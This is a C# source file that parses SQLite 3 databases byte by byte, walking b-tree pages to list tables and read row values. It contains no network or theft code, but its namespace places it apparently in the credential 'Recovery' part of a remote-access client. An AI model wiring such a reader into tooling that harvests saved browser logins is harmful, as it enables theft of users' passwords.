using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace xClient.Core.Recovery.Utilities
{
    public class SQLiteHandler
    {
        private byte[] db_bytes;
        private ulong encoding;
        private string[] field_names;
        private sqlite_master_entry[] master_table_entries;
        private ushort page_size;
        private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public SQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
                string str = Strings.Space((int)FileSystem.LOF(1));
                FileSystem.FileGet(1, ref str, -1L, false);
                FileSystem.FileClose(new int[] { 1 });
                this.db_bytes = Encoding.Default.GetBytes(str);
                if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }
                if (this.db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }
                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                this.page_size = (ushort)this.ConvertToInteger(0x10, 2);
                this.encoding = this.ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(this.encoding), decimal.Zero) == 0)
                {
                    this.encoding = 1L;
                }
                this.ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if ((Size > 8) | (Size == 0))
            {
                return 0L;
            }
            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = (num2 << 8) | this.db_bytes[startIndex + i];
            }
            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if ((num4 == 0) | (num4 > 9))
            {
                return 0L;
            }
            if (num4 == 1)
            {
                buffer[0] = (byte)(this.db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }
            if (num4 == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = this.db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }
            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if ((i - 1) >= startIndex)
                {
                    buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
                }
            }
            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return this.table_entries.Length;
        }

        public string[] GetTableNames()
        {
            string[] strArray2 = null;
            int index = 0;
            int num3 = this.master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (this.master_table_entries[i].item_type == "table")
                {
                    strArray2 = (string[])Utils.CopyArray((Array)strArray2, new string[index + 1]);
                    strArray2[index] = this.master_table_entries[i].item_name;
                    index++;
                }
            }
            return strArray2;
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= this.table_entries.Length)
            {
                return null;
            }
            if (field >= this.table_entries[row_num].content.Length)
            {
                return null;
            }
            return this.table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = this.field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return this.GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > this.db_bytes.Length)
            {
                return 0;
            }
            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > (this.db_bytes.Length - 1))
                {
                    return 0;
                }
                if ((this.db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return (startIndex + 8);
        }

        private bool IsOdd(long value)
        {
            return ((value & 1L) == 1L);
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.master_table_entries != null)
                {
                    length = this.master_table_entries.Length;
                    this.master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)this.master_table_entries, new sqlite_master_entry[(this.master_table_entries.Length + num2) + 1]);
                }
                else
                {
                    this.master_table_entries = new sqlite_master_entry[num2 + 1];
                }
                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num7 = this.CVL((int)num, endIndex);
                    int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.master_table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num6 = endIndex;
                    long num5 = this.CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = this.GVL(endIndex);
                        numArray[index] = this.CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (this.IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            numArray[index] = this.SQLDataTypeSize[(int)numArray[index]];
                        }
                        index++;
                    }
                    while (index <= 4);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    this.master_table_entries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(startIndex, 4)), decimal.One), new decimal(this.page_size))));
                    }
                    else
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(this.page_size))));
                    }
                }
                this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int index = -1;
            int length = this.master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }
            if (index == -1)
            {
                return false;
            }
            string[] strArray = this.master_table_entries[index].sql_statement.Substring(this.master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = (strArray[j]).TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }
                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }
                this.field_names = (string[])Utils.CopyArray((Array)this.field_names, new string[j + 1]);
                this.field_names[j] = strArray[j];
            }
            return this.ReadTableFromOffset((ulong)((this.master_table_entries[index].root_num - 1L) * this.page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.table_entries != null)
                {
                    length = this.table_entries.Length;
                    this.table_entries = (table_entry[])Utils.CopyArray((Array)this.table_entries, new table_entry[(this.table_entries.Length + num2) + 1]);
                }
                else
                {
                    this.table_entries = new table_entry[num2 + 1];
                }
                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    record_header_field[] _fieldArray = null;
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num9 = this.CVL((int)num, endIndex);
                    int num8 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num8 = endIndex;
                    long num7 = this.CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        _fieldArray = (record_header_field[])Utils.CopyArray((Array)_fieldArray, new record_header_field[j + 1]);
                        endIndex = num8 + 1;
                        num8 = this.GVL(endIndex);
                        _fieldArray[j].type = this.CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (this.IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 13L)) / 2.0));
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = this.SQLDataTypeSize[(int)_fieldArray[j].type];
                        }
                        num10 = (num10 + (num8 - endIndex)) + 1L;
                    }
                    this.table_entries[length + i].content = new string[(_fieldArray.Length - 1) + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!this.IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                                {
                                    this.table_entries[length + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                                {
                                    this.table_entries[length + i].content[k] = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                                {
                                    this.table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                this.table_entries[length + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            this.table_entries[length + i].content[k] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
                        }
                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(this.page_size))));
                }
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}
